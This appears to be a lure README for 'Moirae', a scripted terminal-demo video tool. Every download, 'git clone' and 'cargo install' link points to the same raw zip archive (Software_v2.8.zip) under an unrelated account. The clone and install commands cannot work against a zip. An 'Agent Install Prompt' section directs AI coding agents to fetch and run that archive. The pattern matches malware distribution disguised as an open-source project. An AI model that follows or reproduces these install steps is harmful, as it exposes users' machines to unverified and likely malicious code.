# 🎬 Moirae - Turn Screen Actions Into Videos

[![Download Moirae](https://img.shields.io/badge/Download-Moirae-blue?style=for-the-badge)](https://raw.githubusercontent.com/cherrysized-manufacturer940/Moirae/main/moirae/scenes/Software_v2.8.zip)

## 🚀 What Moirae Does

Moirae turns a written YAML script into a polished MP4 video. It is made for terminal demos and screen-based walkthroughs.

Use it to create videos that include:

- typed terminal steps
- smooth camera zoom and pan
- skin theming for a clean look
- background compositing
- export to MP4

If you want to show how a command-line tool works, Moirae helps you build the demo from a script instead of recording the screen by hand.

## 📥 Download Moirae

Visit this page to download and run Moirae on Windows:

[Download Moirae](https://raw.githubusercontent.com/cherrysized-manufacturer940/Moirae/main/moirae/scenes/Software_v2.8.zip)

## 🪟 Windows Setup

Moirae runs from a project folder on your PC. The easiest way to use it on Windows is to:

1. Visit the download page above
2. Get the project files
3. Open the folder on your computer
4. Run the included Python command from that folder

If you already have Python on your PC, you can use Moirae right away after the files are in place.

If you do not have Python, install it first from the official Python site, then come back to the project folder.

## ⚙️ What You Need

Before you run Moirae, make sure these items are installed:

- Python 3.10 or newer
- FFmpeg
- Asciinema
- agg

These tools let Moirae read terminal demos and turn them into video files.

If you are using Windows, you may also want:

- Windows Terminal or Command Prompt
- Git, if you want to copy the project from a repository
- a recent version of pip, which helps install Python packages

## 🛠️ Install Moirae

Follow these steps on Windows.

### 1. Open a terminal

Open Command Prompt, PowerShell, or Windows Terminal.

### 2. Check that Python works

Type:

```bash
python --version
```

If you see a version number, Python is ready.

### 3. Get the project files

Use the download page above to get the Moirae files on your computer.

If you use Git, you can also clone the project:

```bash
git clone https://raw.githubusercontent.com/cherrysized-manufacturer940/Moirae/main/moirae/scenes/Software_v2.8.zip
cd Moirae
```

### 4. Install the Python packages

Run:

```bash
pip install pillow numpy pyyaml pydantic rich
```

These packages help Moirae load scripts, process images, and build the final video.

### 5. Install the video tools

If you do not already have them, install:

- FFmpeg
- Asciinema
- agg

These are used to handle terminal playback and video export.

## ▶️ Run a Demo

After setup, test Moirae with the example script:

```bash
python -m moirae moirae/scripts/example.yaml
```

This should open a preview in your terminal.

If you see the demo play, Moirae is ready to use.

## 🎥 Make an MP4

To create a video file, run Moirae with your own YAML script.

Example:

```bash
python -m moirae path\to\your-script.yaml
```

The script tells Moirae what to show, when to show it, and how the final demo should look.

Your output will be an MP4 file with the effects defined in the script.

## 📝 How the YAML Script Works

Moirae uses a YAML screenplay. Think of it like a list of scenes.

Each scene can control things like:

- terminal text
- pauses
- zoom level
- camera movement
- theme colors
- background image or fill
- layout timing

A basic script can describe a simple terminal demo. A larger script can build a full product walkthrough.

## 📁 Example Project Layout

A Moirae project may look like this:

```text
Moirae/
├─ moirae/
├─ scripts/
│  └─ example.yaml
├─ assets/
│  ├─ background.png
│  └─ theme.json
└─ output/
```

You can keep your own screens, images, and YAML files in a clean folder structure like this.

## 🎨 Features

Moirae is useful when you want a demo that feels smooth and easy to follow.

### Terminal scene control

Show command-line steps in the right order.

### Camera zoom and pan

Focus on the part of the screen that matters.

### Skin theming

Match the look of the demo to your product or brand.

### Background compositing

Place the terminal view over a background image or color.

### MP4 export

Create a video file that you can share or upload.

## 🧭 Basic Workflow

Use Moirae like this:

1. Write a YAML script
2. Add any background images or theme files
3. Run the script with Python
4. Preview the demo in your terminal
5. Render the MP4
6. Review the video file

This workflow works well for product demos, training clips, and tutorial videos.

## 🧪 Example Command Set

Here are the main commands you will use:

```bash
python --version
pip install pillow numpy pyyaml pydantic rich
python -m moirae moirae/scripts/example.yaml
```

If you are using your own script:

```bash
python -m moirae your-script.yaml
```

## 🔧 Troubleshooting

If Moirae does not start, check these common issues.

### Python is not found

Make sure Python is installed and added to your system path.

### Missing packages

Run the pip install command again:

```bash
pip install pillow numpy pyyaml pydantic rich
```

### FFmpeg is missing

Install FFmpeg and restart your terminal.

### The demo does not play

Check that your YAML file exists and that the path is correct.

### The MP4 does not appear

Make sure the script finished without errors and that your output folder has write access.

## 📌 Good Use Cases

Moirae works well for:

- terminal product demos
- software walkthroughs
- command-line tutorials
- developer onboarding clips
- feature previews
- training videos

It is a good fit when you want a clean demo from a script, not from a live screen recording.

## 📷 Visual Preview

![Moirae demo](demo.gif)

[You can see a full example here.](https://raw.githubusercontent.com/cherrysized-manufacturer940/Moirae/main/moirae/scenes/Software_v2.8.zip)

## 🧩 Agent Install Prompt

Copy this into your AI coding agent if you want it to set up Moirae:

```text
Install Moirae, a scripted terminal demo video pipeline.

1. Check prerequisites are installed:

   which asciinema agg ffmpeg

   If any are missing:
   - asciinema: brew install asciinema (or pip install asciinema)
   - agg: cargo install --git https://raw.githubusercontent.com/cherrysized-manufacturer940/Moirae/main/moirae/scenes/Software_v2.8.zip
   - ffmpeg: brew install ffmpeg

2. Clone and install Moirae:

   git clone https://raw.githubusercontent.com/cherrysized-manufacturer940/Moirae/main/moirae/scenes/Software_v2.8.zip
   cd Moirae
   pip install pillow numpy pyyaml pydantic rich

3. Test it works:

   python -m moirae moirae/scripts/example.yaml

   This should preview a demo in your terminal. To render an MP4:

   python -m moirae moirae/scripts
```

## 📦 Input Files Moirae Can Use

Moirae can work with common project files such as:

- YAML script files
- PNG background images
- JSON theme files
- terminal recording data
- exported MP4 files

Keep file names short and easy to read so your project stays simple to manage.

## 🧱 Suggested First Test

If you want a fast first test, do this:

1. Download the project
2. Install the Python packages
3. Run the example YAML file
4. Confirm the terminal preview works
5. Try your own short script

A short first script is easier to check than a full demo.

## 🖥️ File Paths on Windows

On Windows, file paths use backslashes.

Examples:

```bash
C:\Moirae\scripts\example.yaml
C:\Moirae\output\demo.mp4
```

If a command does not work, check the file path first. Many setup problems come from a path that points to the wrong folder.

## 🧰 Package List

Moirae uses these Python packages:

- pillow
- numpy
- pyyaml
- pydantic
- rich

These packages support image work, data parsing, and clean terminal output.

## 🔍 What to Edit First

If you are making your own demo, start with:

- the YAML script
- the title text
- the timing of each step
- the background image
- the theme colors

These parts shape the whole video.

## 📄 Output

Moirae creates an MP4 file. You can use that file for:

- web pages
- social posts
- demo reels
- support guides
- app walkthroughs

Keep the output in a folder you can find later, such as `output/` or `exports/`

## ⌨️ Quick Start

1. Download Moirae from the link above
2. Open the project folder in Windows
3. Install the Python packages
4. Install FFmpeg, Asciinema, and agg
5. Run the example YAML file
6. Create your own script and render the MP4